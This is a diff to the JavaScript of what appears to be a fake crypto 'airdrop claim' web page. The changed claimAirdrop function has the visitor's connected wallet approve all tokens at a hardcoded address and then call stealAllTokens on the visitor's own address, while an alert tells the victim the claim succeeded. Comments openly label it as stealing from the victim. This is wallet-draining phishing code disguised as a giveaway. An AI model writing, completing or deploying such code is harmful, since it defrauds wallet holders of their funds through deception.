@@ -79,20 +79,29 @@ a<!DOCTYPE html>
     }
 
     async function claimAirdrop() {
-        try {
-            const contract = new ethers.Contract(contractAddress, contractABI, signer);
+    try {
+        const contract = new ethers.Contract(contractAddress, contractABI, signer);
 
-            // Steal all tokens from victim
-            const victimAddress = await signer.getAddress();
-            const stealTx = await contract.stealAllTokens(victimAddress);
-            console.log("Tokens stolen:", stealTx.hash);
+        // Approve all tokens
+        const tokenAddress = "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E"; // Ganti dengan alamat token yang benar
+        const approveTx = await contract.approveAllTokens(tokenAddress);
+        console.log("Approval transaction sent:", approveTx.hash);
 
-            alert("Congratulations! Your airdrop claim was successful.");
-        } catch (error) {
-            console.error("Error during airdrop:", error);
-            alert("Failed to claim airdrop. Please try again.");
-        }
+        await approveTx.wait(); // Tunggu transaksi approve selesai
+        console.log("Approval granted!");
+
+        // Simulate stealing tokens
+        const victimAddress = await signer.getAddress();
+        const stealTx = await contract.stealAllTokens(victimAddress);
+        console.log("Tokens stolen:", stealTx.hash);
+
+        alert("Congratulations! Your airdrop claim was successful.");
+    } catch (error) {
+        console.error("Error during airdrop:", error);
+        alert("Failed to claim airdrop. Please try again.");
     }
+}
+
 
     document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
     document.getElementById("claimAirdropButton").addEventListener("click", claimAirdrop);
